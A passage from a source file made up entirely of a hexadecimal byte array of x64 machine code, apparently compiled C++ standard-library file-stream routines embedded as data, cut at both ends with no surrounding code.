0x05,	0x74, 0x5A, 0x00, 0x00, 0x48, 0x33, 0xC4, 0x48, 0x89, 0x45, 0xF8, 0x48,	0x8B, 0xF9, 0x48, 0x8B, 0x41, 0x38, 0x48, 0x8B, 0x08, 0x48, 0x85, 0xC9,	0x74, 0x2C, 0x48, 0x8B, 0x57, 0x50, 0x4C, 0x63, 0x02, 0x4A, 0x8D, 0x04,	0x01, 0x48, 0x3B, 0xC8, 0x73, 0x1C, 0x41, 0x8D, 0x40, 0xFF, 0x89, 0x02,	0x48, 0x8B, 0x4F, 0x38, 0x48, 0x8B, 0x11, 0x48, 0x8D, 0x42, 0x01, 0x48,	0x89, 0x01, 0x0F, 0xB6, 0x02, 0xE9, 0x42, 0x02, 0x00, 0x00, 0x48, 0x83,	0xBF, 0x80, 0x00, 0x00, 0x00, 0x00, 0x75, 0x0A, 0xB8, 0xFF, 0xFF, 0xFF,	0xFF, 0xE9, 0x2E, 0x02, 0x00, 0x00, 0x4C, 0x8B, 0x47, 0x18, 0x48, 0x8D,	0x47, 0x70, 0x49, 0x39, 0x00, 0x75, 0x20, 0x48, 0x8B, 0x97, 0x90, 0x00,	0x00, 0x00, 0x48, 0x8B, 0x8F, 0x88, 0x00, 0x00, 0x00, 0x49, 0x89, 0x08,	0x48, 0x8B, 0x47, 0x38, 0x48, 0x89, 0x08, 0x2B, 0xD1, 0x48, 0x8B, 0x47,	0x50, 0x89, 0x10, 0x48, 0x8B, 0x8F, 0x80, 0x00, 0x00, 0x00, 0x48, 0x83,	0x7F, 0x68, 0x00, 0x75, 0x1C, 0xFF, 0x15, 0xD5, 0x2C, 0x00, 0x00, 0x83,	0xF8, 0xFF, 0xBB, 0xFF, 0xFF, 0xFF, 0xFF, 0x0F, 0x84, 0xDD, 0x01, 0x00,	0x00, 0x0F, 0xB6, 0xD8, 0xE9, 0xD5, 0x01, 0x00, 0x00, 0x48, 0xC7, 0x45,	0xE8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x45, 0xF0, 0x0F, 0x00, 0x00,	0x00, 0xC6, 0x45, 0xD8, 0x00, 0xFF, 0x15, 0xA5, 0x2C, 0x00, 0x00, 0x44,	0x8B, 0xC0, 0x83, 0xF8, 0xFF, 0x0F, 0x84, 0x00, 0x01, 0x00, 0x00, 0x90,	0x48, 0x8B, 0x4D, 0xE8, 0x48, 0x8B, 0x55, 0xF0, 0x48, 0x3B, 0xCA, 0x73,	0x20, 0x48, 0x8D, 0x41, 0x01, 0x48, 0x89, 0x45, 0xE8, 0x48, 0x8D, 0x45,	0xD8, 0x48, 0x83, 0xFA, 0x10, 0x48, 0x0F, 0x43, 0x45, 0xD8, 0x44, 0x88,	0x04, 0x08, 0xC6, 0x44, 0x08, 0x01, 0x00, 0xEB, 0x0D, 0x45, 0x0F, 0xB6,	0xC8, 0x48, 0x8D, 0x4D, 0xD8, 0xE8, 0xA6, 0x0D, 0x00, 0x00, 0x48, 0x8D,	0x55, 0xD8, 0x48, 0x83, 0x7D, 0xF0, 0x10, 0x48, 0x0F, 0x43, 0x55, 0xD8,	0x4C, 0x8D, 0x45, 0xD8, 0x4C, 0x0F, 0x43, 0x45, 0xD8, 0x4C, 0x8B, 0x4D,	0xE8, 0x4C, 0x03, 0xCA, 0x48, 0x8D, 0x45, 0xC8, 0x48, 0x89, 0x44, 0x24,	0x38, 0x48, 0x8D, 0x45, 0xD1, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8D,	0x45, 0xD0, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8D, 0x45, 0xC0, 0x48,	0x89, 0x44, 0x24, 0x20, 0x48, 0x8D, 0x57, 0x74, 0x48, 0x8B, 0x4F, 0x68,	0xFF, 0x15, 0xEE, 0x29, 0x00, 0x00, 0x85, 0xC0, 0x78, 0x71, 0x83, 0xF8,	0x01, 0x0F, 0x8F, 0xF3, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x45, 0xD0, 0x48,	0x39, 0x45, 0xC8, 0x48, 0x8D, 0x45, 0xD8, 0x0F, 0x85, 0x9C, 0x00, 0x00,	0x00, 0x48, 0x83, 0x7D, 0xF0, 0x10, 0x48, 0x0F, 0x43, 0x45, 0xD8, 0x4C,	0x8B, 0x55, 0xC0, 0x4C, 0x2B, 0xD0, 0x4C, 0x8B, 0x45, 0xE8, 0x4D, 0x3B,	0xC2, 0x4D, 0x0F, 0x42, 0xD0, 0x48, 0x8D, 0x4D, 0xD8, 0x48, 0x83, 0x7D,	0xF0, 0x10, 0x48, 0x0F, 0x43, 0x4D, 0xD8, 0x4D, 0x2B, 0xC2, 0x4C, 0x89,	0x45, 0xE8, 0x49, 0xFF, 0xC0, 0x4A, 0x8D, 0x14, 0x11, 0xE8, 0x4B, 0x24,	0x00, 0x00, 0x48, 0x8B, 0x8F, 0x80, 0x00, 0x00, 0x00, 0xFF, 0x15, 0xA5,	0x2B, 0x00, 0x00, 0x44, 0x8B, 0xC0, 0x83, 0xF8, 0xFF, 0x0F, 0x85, 0x01,	0xFF, 0xFF, 0xFF, 0xBB, 0xFF, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x55, 0xF0,	0x48, 0x83, 0xFA, 0x10, 0x0F, 0x82, 0x9C, 0x00, 0x00, 0x00, 0x48, 0xFF,	0xC2, 0x48, 0x8B, 0x4D, 0xD8, 0x48, 0x8B, 0xC1, 0x48, 0x81, 0xFA, 0x00,	0x10, 0x00, 0x00, 0x0F, 0x82, 0x80, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC2,	0x27, 0x48, 0x8B, 0x49, 0xF8, 0x48, 0x2B, 0xC1, 0x48, 0x83, 0xC0, 0xF8,	0x48, 0x83, 0xF8, 0x1F, 0x76, 0x6B, 0xFF, 0x15, 0xE4, 0x2A, 0x00, 0x00,	0x90, 0x48, 0x83, 0x7D, 0xF0, 0x10, 0x48, 0x0F, 0x43, 0x45, 0xD8, 0x48,	0x8B, 0x5D, 0xE8, 0x48, 0x8B, 0x4D, 0xC0, 0x48, 0x2B, 0xD9, 0x48, 0x03,	0xD8, 0x48, 0x85, 0xDB, 0x7E, 0x1F, 0x48, 0xFF, 0xCB, 0x0F, 0xBE, 0x0C,	0x0B, 0x48, 0x8B, 0x97, 0x80, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x12, 0x2B,	0x00, 0x00, 0x48, 0x85, 0xDB, 0x7E, 0x06, 0x48, 0x8B, 0x4D, 0xC0, 0xEB,	0xE1, 0x0F, 0xB6, 0x5D, 0xD0, 0xE9, 0x7A, 0xFF, 0xFF, 0xFF, 0x83, 0xF8,	0x03, 0x0F, 0x85, 0x6C, 0xFF, 0xFF, 0xFF, 0x48, 0x8D, 0x45, 0xD8, 0x48,	0x83, 0x7D, 0xF0, 0x10, 0x48, 0x0F, 0x43, 0x45, 0xD8, 0x0F, 0xBE, 0x18,	0xE9, 0x5B, 0xFF, 0xFF, 0xFF, 0xE8, 0x66, 0x14, 0x00, 0x00, 0x8B, 0xC3,	0x48, 0x8B, 0x4D, 0xF8, 0x48, 0x33, 0xCC, 0xE8, 0x34, 0x14, 0x00, 0x00,	0x4C, 0x8D, 0x9C, 0x24, 0x80, 0x00, 0x00, 0x00, 0x49, 0x8B, 0x5B, 0x18,	0x49, 0x8B, 0x7B, 0x20, 0x49, 0x8B, 0xE3, 0x5D, 0xC3, 0xCC, 0xCC, 0xCC,	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,	0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0x41, 0x38, 0x48, 0x8B,	0xD9, 0x48, 0x8B, 0x08, 0x48, 0x85, 0xC9, 0x74, 0x18, 0x48, 0x8B, 0x43,	0x50, 0x48, 0x63, 0x10, 0x48, 0x03, 0xD1, 0x48, 0x3B, 0xCA, 0x73, 0x09,	0x0F, 0xB6, 0x01, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0x48, 0x8B, 0x03,	0x48, 0x8B, 0xCB, 0x48, 0x89, 0x7C, 0x24, 0x30, 0xFF, 0x50, 0x38, 0x8B,	0xF8, 0x83, 0xF8, 0xFF, 0x75, 0x0B, 0x48, 0x8B, 0x7C, 0x24, 0x30, 0x48,	0x83, 0xC4, 0x20, 0x5B, 0xC3, 0x48, 0x8B, 0x03, 0x8B, 0xD7, 0x48, 0x8B,	0xCB, 0xFF, 0x50, 0x20, 0x8B, 0xC7, 0x48, 0x8B, 0x7C, 0x24, 0x30, 0x48,	0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x5C, 0x24, 0x18, 0x57, 0x48, 0x83,	0xEC, 0x20, 0x48, 0x8B, 0x41, 0x38, 0x48, 0x8B, 0xD9, 0x8B, 0xFA, 0x48,	0x8B, 0x08, 0x48, 0x85, 0xC9, 0x74, 0x36, 0x48, 0x8B, 0x43, 0x18, 0x48,	0x39, 0x08, 0x73, 0x2D, 0x83, 0xFA, 0xFF, 0x74, 0x08, 0x0F, 0xB6, 0x41,	0xFF, 0x3B, 0xC2, 0x75, 0x20, 0x48, 0x8B, 0x43, 0x50, 0xFF, 0x00, 0x48,	0x8B, 0x43, 0x38, 0x48, 0xFF, 0x08, 0x33, 0xC0, 0x83, 0xFF, 0xFF, 0x0F,	0x45, 0xC7, 0x48, 0x8B, 0x5C, 0x24, 0x40, 0x48, 0x83, 0xC4, 0x20, 0x5F,	0xC3, 0x48, 0x8B, 0x93, 0x80, 0x00, 0x00, 0x00, 0x48, 0x85, 0xD2, 0x74,	0x73, 0x83, 0xFF, 0xFF, 0x74, 0x6E, 0x48, 0x83, 0x7B, 0x68, 0x00, 0x75,	0x0F, 0x40, 0x0F, 0xB6, 0xCF, 0xFF, 0x15, 0xC5, 0x29, 0x00, 0x00, 0x83,	0xF8, 0xFF, 0x75, 0x4B, 0x4C, 0x8B, 0x43, 0x38, 0x48, 0x8D, 0x53, 0x70,	0x49, 0x39, 0x10, 0x74, 0x4B, 0x4C, 0x8B, 0x4B, 0x18, 0x40, 0x88, 0x3A,	0x49, 0x8B, 0x01, 0x48, 0x3B, 0xC2, 0x74, 0x18, 0x48, 0x89, 0x83, 0x88,	0x00, 0x00, 0x00, 0x48, 0x8B, 0x43, 0x50, 0x48, 0x63, 0x08, 0x49, 0x03,	0x08, 0x48, 0x89, 0x8B, 0x90, 0x00, 0x00, 0x00, 0x49, 0x89, 0x11, 0x8B,	0xCB, 0x48, 0x8B, 0x43, 0x38, 0x2B, 0xCA, 0x83, 0xC1, 0x71, 0x48, 0x89,	0x10, 0x48, 0x8B, 0x43, 0x50, 0x89, 0x08, 0x8B, 0xC7, 0x48, 0x8B, 0x5C,	0x24, 0x40, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x48, 0x8B, 0x5C, 0x24,	0x40, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3,	0x48, 0x89, 0x5C, 0x24, 0x20, 0x57, 0x48, 0x81, 0xEC, 0x80, 0x00, 0x00,	0x00, 0x48, 0x8B, 0x05, 0x5C, 0x56, 0x00, 0x00, 0x48, 0x33, 0xC4, 0x48,	0x89, 0x44, 0x24, 0x78, 0x8B, 0xFA, 0x48, 0x8B, 0xD9, 0x83, 0xFA, 0xFF,	0x75, 0x07, 0x33, 0xC0, 0xE9, 0x55, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x51,	0x40, 0x48, 0x8B, 0x02, 0x48, 0x85, 0xC0, 0x74, 0x1F, 0x48, 0x8B, 0x51,	0x58, 0x4C, 0x63, 0x02, 0x4C, 0x03, 0xC0, 0x49, 0x3B, 0xC0, 0x73, 0x10,	0xFF, 0x15, 0x12, 0x27, 0x00, 0x00, 0x40, 0x88, 0x38, 0x8B, 0xC7, 0xE9,	0x2A, 0x01, 0x00, 0x00, 0x48, 0x83, 0xB9, 0x80, 0x00, 0x00, 0x00, 0x00,	0x48, 0x89, 0xB4, 0x24, 0xA0, 0x00, 0x00, 0x00, 0x0F, 0x84, 0x07, 0x01,	0x00, 0x00, 0x4C, 0x8B, 0x41, 0x18, 0x48, 0x8D, 0x41, 0x70, 0x49, 0x39,	0x00, 0x75, 0x20, 0x48, 0x8B, 0x91, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8B,	0x89, 0x88, 0x00, 0x00, 0x00, 0x49, 0x89, 0x08, 0x2B, 0xD1, 0x48, 0x8B,	0x43, 0x38, 0x48, 0x89, 0x08, 0x48, 0x8B, 0x43, 0x50, 0x89, 0x10, 0x48,	0x8B, 0x4B, 0x68, 0x48, 0x85, 0xC9, 0x75, 0x22, 0x48, 0x8B, 0x93, 0x80,	0x00, 0x00, 0x00, 0x40, 0x0F, 0xBE, 0xCF, 0xFF, 0x15, 0xAB, 0x28, 0x00,	0x00, 0xB9, 0xFF, 0xFF, 0xFF, 0xFF, 0x3B, 0xC1, 0x0F, 0x45, 0xCF, 0x8B,	0xC1, 0xE9, 0xB4, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x44, 0x24, 0x40, 0x40,	0x88, 0x7C, 0x24, 0x50, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x8D, 0x53,	0x74, 0x48, 0x8D, 0x44, 0x24, 0x78, 0x48, 0x89, 0x44, 0x24, 0x30, 0x4C,	0x8D, 0x4C, 0x24, 0x51, 0x48, 0x8D, 0x44, 0x24, 0x58, 0x48, 0x89, 0x44,	0x24, 0x28, 0x4C, 0x8D, 0x44, 0x24, 0x50, 0x48, 0x8D, 0x44, 0x24, 0x48,	0x48, 0x89, 0x44, 0x24, 0x20, 0xFF, 0x15, 0x49, 0x26, 0x00, 0x00, 0x85,	0xC0, 0x78, 0x6A, 0x83, 0xF8, 0x01, 0x7E, 0x25, 0x83, 0xF8, 0x03, 0x75,	0x60, 0x0F, 0xBE, 0x4C, 0x24, 0x50, 0x48, 0x8B, 0x93, 0x80, 0x00, 0x00,	0x00, 0xFF, 0x15, 0x39, 0x28, 0x00, 0x00, 0xB9, 0xFF, 0xFF, 0xFF, 0xFF,	0x3B, 0xC1, 0x0F, 0x45, 0xCF, 0x8B, 0xC1, 0xEB, 0x45, 0x48, 0x8B, 0x74,	0x24, 0x40, 0x48, 0x8D, 0x44, 0x24, 0x58, 0x48, 0x2B, 0xF0, 0x74, 0x1F,	0x4C, 0x8B, 0x8B, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x58,	0x4C, 0x8B, 0xC6, 0xBA, 0x01, 0x00, 0x00, 0x00, 0xFF, 0x15, 0xCA, 0x27,	0x00, 0x00, 0x48, 0x3B, 0xF0, 0x75, 0x12, 0x48, 0x8D, 0x44, 0x24, 0x50,	0xC6, 0x43, 0x71, 0x01, 0x48, 0x39, 0x44, 0x24, 0x48, 0x8B, 0xC7, 0x75,	0x05, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0xB4, 0x24, 0xA0, 0x00,	0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x78, 0x48, 0x33, 0xCC, 0xE8, 0x31,	0x11, 0x00, 0x00, 0x48, 0x8B, 0x9C, 0x24, 0xA8, 0x00, 0x00, 0x00, 0x48,	0x81, 0xC4, 0x80, 0x00, 0x00, 0x00, 0x5F, 0xC3, 0x48, 0x8B, 0x89, 0x80,	0x00, 0x00, 0x00, 0x48, 0x85, 0xC9, 0x74, 0x07, 0x48, 0xFF, 0x25, 0xCD,	0x26, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x8B, 0x89, 0x80, 0x00, 0x00, 0x00, 0x48,	0x85, 0xC9, 0x74, 0x07, 0x48, 0xFF, 0x25, 0xA5, 0x26, 0x00, 0x00, 0xC3,	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,	0x48, 0x89, 0x5C, 0x24, 0x18, 0x55, 0x56, 0x57, 0x48, 0x83, 0xEC, 0x50,	0x48, 0x8B, 0x05, 0x7D, 0x54, 0x00, 0x00, 0x48, 0x33, 0xC4, 0x48, 0x89,	0x44, 0x24, 0x48, 0x48, 0x8B, 0xC2, 0x48, 0x8B, 0xF9, 0x48, 0x83, 0x7A,	0x18, 0x10, 0x72, 0x03, 0x48, 0x8B, 0x02, 0x48, 0x8D, 0x59, 0x08, 0x48,	0x83, 0xBB, 0x80, 0x00, 0x00, 0x00, 0x00, 0x74, 0x37, 0x48, 0x8B, 0x01,	0x48, 0x83, 0xC0, 0x04, 0x48, 0x63, 0x08, 0x48, 0x03, 0xCF, 0x45, 0x33,	0xC0, 0x41, 0x8D, 0x50, 0x02, 0xFF, 0x15, 0x35, 0x25, 0x00, 0x00, 0x48,	0x8B, 0x4C, 0x24, 0x48, 0x48, 0x33, 0xCC, 0xE8, 0x80, 0x10, 0x00, 0x00,	0x48, 0x8B, 0x9C, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x50,	0x5F, 0x5E, 0x5D, 0xC3, 0xBA, 0x02, 0x00, 0x00, 0x00, 0x44, 0x8D, 0x42,	0x3E, 0x48, 0x8B, 0xC8, 0xFF, 0x15, 0x7E, 0x25, 0x00, 0x00, 0x48, 0x8B,	0xF0, 0x48, 0x85, 0xC0, 0x75, 0x05, 0x48, 0x8B, 0x07, 0xEB, 0xAD, 0xC6,	0x43, 0x7C, 0x01, 0xC6, 0x43, 0x71, 0x00, 0x48, 0x8B, 0xCB, 0xFF, 0x15,	0xB8, 0x24, 0x00, 0x00, 0x33, 0xED, 0x48, 0x89, 0x6C, 0x24, 0x30, 0x48,	0x89, 0x6C, 0x24, 0x38, 0x48, 0x89, 0x6C, 0x24, 0x40, 0x4C, 0x8D, 0x4C,	0x24, 0x40, 0x4C, 0x8D, 0x44, 0x24, 0x38, 0x48, 0x8D, 0x54, 0x24, 0x30,	0x48, 0x8B, 0xCE, 0xFF, 0x15, 0xC7, 0x26, 0x00, 0x00, 0x48, 0x8B, 0x44,	0x24, 0x30, 0x48, 0x89, 0x43, 0x18, 0x48, 0x89, 0x43, 0x20, 0x48, 0x8B,	0x44, 0x24, 0x38, 0x48, 0x89, 0x43, 0x38, 0x48, 0x89, 0x43, 0x40, 0x48,	0x8B, 0x44, 0x24, 0x40, 0x48, 0x89, 0x43, 0x50, 0x48, 0x89, 0x43, 0x58,	0x48, 0x89, 0xB3, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x92, 0x5D,	0x00, 0x00, 0x48, 0x89, 0x43, 0x74, 0x48, 0x89, 0x6B, 0x68, 0x48, 0x8D,	0x54, 0x24, 0x20, 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0x24, 0x24, 0x00, 0x00,	0x90, 0x48, 0x8B, 0xC8, 0xE8, 0xB3, 0x06, 0x00, 0x00, 0x48, 0x8B, 0xF0,	0x48, 0x8B, 0xC8, 0xFF, 0x15, 0xA7, 0x24, 0x00, 0x00, 0x84, 0xC0, 0x74,	0x06, 0x48, 0x89, 0x6B, 0x68, 0xEB, 0x0E, 0x48, 0x89, 0x73, 0x68, 0x48,	0x8B, 0xCB, 0xFF, 0x15, 0x18, 0x24, 0x00, 0x00, 0x90, 0x48, 0x8B, 0x4C,	0x24, 0x28, 0x48, 0x85, 0xC9, 0x74, 0x19, 0x48, 0x8B, 0x01, 0xFF, 0x50,	0x10, 0x48, 0x85, 0xC0, 0x74, 0x0E, 0x4C, 0x8B, 0x00, 0xBA, 0x01, 0x00,	0x00, 0x00, 0x48, 0x8B, 0xC8, 0x41, 0xFF, 0x10, 0x48, 0x8B, 0x07, 0x48,	0x83, 0xC0, 0x04, 0x48, 0x85, 0xDB, 0x0F, 0x84, 0xCC, 0xFE, 0xFF, 0xFF,	0x48, 0x63, 0x08, 0x48, 0x03, 0xCF, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0xFF,	0x15, 0xDB, 0x23, 0x00, 0x00, 0xE9, 0xC9, 0xFE, 0xFF, 0xFF, 0xCC, 0xCC,	0xCC, 0xCC, 0xCC, 0xCC, 0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B,	0x51, 0x18, 0x48, 0x8B, 0xD9, 0x48, 0x83, 0xFA, 0x10, 0x72, 0x2C, 0x48,	0x8B, 0x09, 0x48, 0xFF, 0xC2, 0x48, 0x81, 0xFA, 0x00, 0x10, 0x00, 0x00,	0x72, 0x18, 0x4C, 0x8B, 0x41, 0xF8, 0x48, 0x83, 0xC2, 0x27, 0x49, 0x2B,	0xC8, 0x48, 0x8D, 0x41, 0xF8, 0x48, 0x83, 0xF8, 0x1F, 0x77, 0x21, 0x49,	0x8B, 0xC8, 0xE8, 0x35, 0x0F, 0x00, 0x00, 0x48, 0xC7, 0x43, 0x10, 0x00,	0x00, 0x00, 0x00, 0x48, 0xC7, 0x43, 0x18, 0x0F, 0x00, 0x00, 0x00, 0xC6,	0x03, 0x00, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xFF, 0x15, 0x2A, 0x25,	0x00, 0x00, 0xCC, 0xCC, 0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x48, 0x83,	0xEC, 0x20, 0x8B, 0xFA, 0x48, 0x8B, 0xD9, 0x48, 0x8D, 0x05, 0x2A, 0x28,	0x00, 0x00, 0x48, 0x89, 0x01, 0x48, 0x83, 0xB9, 0x80, 0x00, 0x00, 0x00,	0x00, 0x74, 0x2D, 0x4C, 0x8B, 0x41, 0x18, 0x48, 0x8D, 0x41, 0x70, 0x49,	0x39, 0x00, 0x75, 0x20, 0x48, 0x8B, 0x91, 0x90, 0x00, 0x00, 0x00, 0x48,	0x8B, 0x89, 0x88, 0x00, 0x00, 0x00, 0x49, 0x89, 0x08, 0x48, 0x8B, 0x43,	0x38, 0x48, 0x89, 0x08, 0x2B, 0xD1, 0x48, 0x8B, 0x43, 0x50, 0x89, 0x10,	0x80, 0x7B, 0x7C, 0x00, 0x74, 0x08, 0x48, 0x8B, 0xCB, 0xE8, 0x62, 0x01,	0x00, 0x00, 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0x49, 0x23, 0x00, 0x00, 0x90,	0x40, 0xF6, 0xC7, 0x01, 0x74, 0x0D, 0xBA, 0x98, 0x00, 0x00, 0x00, 0x48,	0x8B, 0xCB, 0xE8, 0x99, 0x0E, 0x00, 0x00, 0x48, 0x8B, 0xC3, 0x48, 0x8B,	0x5C, 0x24, 0x30, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC,	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x48, 0x83,	0xEC, 0x20, 0x48, 0x8D, 0xB9, 0x58, 0xFF, 0xFF, 0xFF, 0x8B, 0xDA, 0x48,	0x8B, 0xCF, 0xE8, 0xA5, 0xF0, 0xFF, 0xFF, 0xF6, 0xC3, 0x01, 0x74, 0x0D,	0xBA, 0x08, 0x01, 0x00, 0x00, 0x48, 0x8B, 0xCF, 0xE8, 0x57, 0x0E, 0x00,	0x00, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x8B, 0xC7, 0x48, 0x83, 0xC4,	0x20, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x40, 0x53, 0x48, 0x83,	0xEC, 0x60, 0x48, 0x8B, 0x05, 0xC3, 0x51, 0x00, 0x00, 0x48, 0x33, 0xC4,	0x48, 0x89, 0x44, 0x24, 0x58, 0x48, 0x83, 0x79, 0x68, 0x00, 0x48, 0x8B,	0xD9, 0x0F, 0x84, 0xB0, 0x00, 0x00, 0x00, 0x80, 0x79, 0x71, 0x00, 0x0F,	0x84, 0xA6, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x01, 0xBA, 0xFF, 0xFF, 0xFF,	0xFF, 0x48, 0x89, 0x7C, 0x24, 0x78, 0xFF, 0x50, 0x18, 0x83, 0xF8, 0xFF,	0x0F, 0x84, 0x89, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4B, 0x68, 0x48, 0x8D,	0x44, 0x24, 0x30, 0x48, 0x8D, 0x53, 0x74, 0x48, 0x89, 0x44, 0x24, 0x20,	0x4C, 0x8D, 0x4C, 0x24, 0x58, 0x4C, 0x8D, 0x44, 0x24, 0x38, 0xFF, 0x15,	0x20, 0x22, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x28, 0x83, 0xE8, 0x01, 0x74,	0x27, 0x83, 0xF8, 0x02, 0x75, 0x59, 0xC6, 0x43, 0x71, 0x00, 0xB0, 0x01,	0x48, 0x8B, 0x7C, 0x24, 0x78, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x48, 0x33,	0xCC, 0xE8, 0x92, 0x0D, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x60, 0x5B, 0xC3,	0xC6, 0x43, 0x71, 0x00, 0x48, 0x8B, 0x7C, 0x24, 0x30, 0x48, 0x8D, 0x44,	0x24, 0x38, 0x48, 0x2B, 0xF8, 0x74, 0x1F, 0x4C, 0x8B, 0x8B, 0x80, 0x00,	0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x38, 0x4C, 0x8B, 0xC7, 0xBA, 0x01,	0x00, 0x00, 0x00, 0xFF, 0x15, 0xC7, 0x23, 0x00, 0x00, 0x48, 0x3B, 0xF8,	0x75, 0x09, 0x80, 0x7B, 0x71, 0x00, 0x0F, 0x94, 0xC0, 0xEB, 0xAD, 0x32,	0xC0, 0xEB, 0xA9, 0xB0, 0x01, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x48, 0x33,	0xCC, 0xE8, 0x3E, 0x0D, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x60, 0x5B, 0xC3,	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x5C, 0x24,	0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x48,	0x83, 0xB9, 0x80, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xD9, 0x74, 0x23,	0xE8, 0xEF, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0x8B, 0x80, 0x00, 0x00, 0x00,	0x33, 0xFF, 0x84, 0xC0, 0x48, 0x8B, 0xF3, 0x48, 0x0F, 0x44, 0xF7, 0xFF,	0x15, 0x47, 0x23, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x07, 0xEB, 0x02, 0x33,	0xFF, 0x48, 0x8B, 0xF7, 0x48, 0x8B, 0xCB, 0xC6, 0x43, 0x7C, 0x00, 0xC6,	0x43, 0x71, 0x00, 0xFF, 0x15, 0x53, 0x21, 0x00, 0x00, 0x48, 0x8B, 0x0D,	0x84, 0x5A, 0x00, 0x00, 0x48, 0x8B, 0xC6, 0x48, 0x8B, 0x74, 0x24, 0x40,	0x48, 0x89, 0x4B, 0x74, 0x48, 0x89, 0xBB, 0x80, 0x00, 0x00, 0x00, 0x48,	0x89, 0x7B, 0x68, 0x48, 0x8B, 0x5C, 0x24, 0x38, 0x48, 0x83, 0xC4, 0x20,	0x5F, 0xC3, 0xCC, 0xCC, 0x40, 0x53, 0x55, 0x57, 0x41, 0x56, 0x41, 0x57,	0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0x69, 0x18, 0x4D, 0x8B, 0xF0, 0x4C,	0x8B, 0xFA, 0x48, 0x8B, 0xD9, 0x4C, 0x3B, 0xC5, 0x77, 0x2C, 0x48, 0x8B,	0xF9, 0x48, 0x83, 0xFD, 0x10, 0x72, 0x03, 0x48, 0x8B, 0x39, 0x4C, 0x89,	0x71, 0x10, 0x48, 0x8B, 0xCF, 0xE8, 0xBB, 0x1B, 0x00, 0x00, 0x48, 0x8B,	0xC3, 0x41, 0xC6, 0x04, 0x3E, 0x00, 0x48, 0x83, 0xC4, 0x20, 0x41, 0x5F,	0x41, 0x5E, 0x5F, 0x5D, 0x5B, 0xC3, 0x48, 0xBF, 0xFF, 0xFF, 0xFF, 0xFF,	0xFF, 0xFF, 0xFF, 0x7F, 0x4C, 0x3B, 0xF7, 0x0F, 0x87, 0xFA, 0x00, 0x00,	0x00, 0x49, 0x8B, 0xCE, 0x48, 0x83, 0xC9, 0x0F, 0x48, 0x3B, 0xCF, 0x77,	0x1F, 0x48, 0x8B, 0xD5, 0x48, 0x8B, 0xC7, 0x48, 0xD1, 0xEA, 0x48, 0x2B,	0xC2, 0x48, 0x3B, 0xE8, 0x77, 0x0E, 0x48, 0x8D, 0x04, 0x2A, 0x48, 0x8B,	0xF9, 0x48, 0x3B, 0xC8, 0x48, 0x0F, 0x42, 0xF8, 0x48, 0x8B, 0xCF, 0x48,	0x89, 0x74, 0x24, 0x68, 0x48, 0x83, 0xC1, 0x01, 0x48, 0xC7, 0xC0, 0xFF,	0xFF, 0xFF, 0xFF, 0x48, 0x0F, 0x42, 0xC8, 0x48, 0x81, 0xF9, 0x00, 0x10,	0x00, 0x00, 0x72, 0x2C, 0x48, 0x8D, 0x41, 0x27, 0x48, 0x3B, 0xC1, 0x0F,	0x86, 0x9C, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xC8, 0xE8, 0x4B, 0x0C, 0x00,	0x00, 0x48, 0x85, 